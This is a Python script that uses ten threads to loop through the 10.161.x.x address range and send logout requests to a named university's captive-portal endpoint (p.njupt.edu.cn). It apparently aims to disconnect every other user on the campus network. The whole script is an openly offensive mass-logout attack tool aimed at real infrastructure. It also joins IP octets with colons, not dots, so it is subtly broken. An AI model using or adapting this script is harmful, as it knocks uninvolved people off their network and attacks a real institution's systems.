import time
import requests
import threading

thNum = 10

mark0 = 10
mark8 = 161
mark16 = 0
mark24 = 0
urlB = '''http://p.njupt.edu.cn:801/eportal/?c=ACSetting&a=Logout&wlanuserip='''
urlE = '''&wlanacip=10.255.254.2&wlanacname=XL_ME60&port=&hostname=p.njupt.edu.cn&iTermType=1&session=&queryACIP=0&mac='''

def netThread():
	while(1):
		global mark0
		global mark8
		global mark16
		global mark24
		global urlB
		global urlE
		
		thLock.acquire()
		mark0 = mark0
		mark8 = mark8
		mark16 = (mark16 + ((mark24+1) // 0x100)) % 0x100
		mark24 = (mark24+1) % 0x100
		ip =  str(mark0)+':'+str(mark8)+':'+str(mark16)+':'+str(mark24)
		thLock.release()
		url = urlB + ip + urlE
		r = requests.get(url, timeout=2) ##
		print(ip)
		print(r.status_code)
		#time.sleep(0.5)



thLock = threading.Lock()

thList = []
for i in range(thNum):
	thList += [threading.Thread(target=netThread)]

for i in thList:
	time.sleep(0.5)
	i.start()

for i in thList:
	i.join()
	
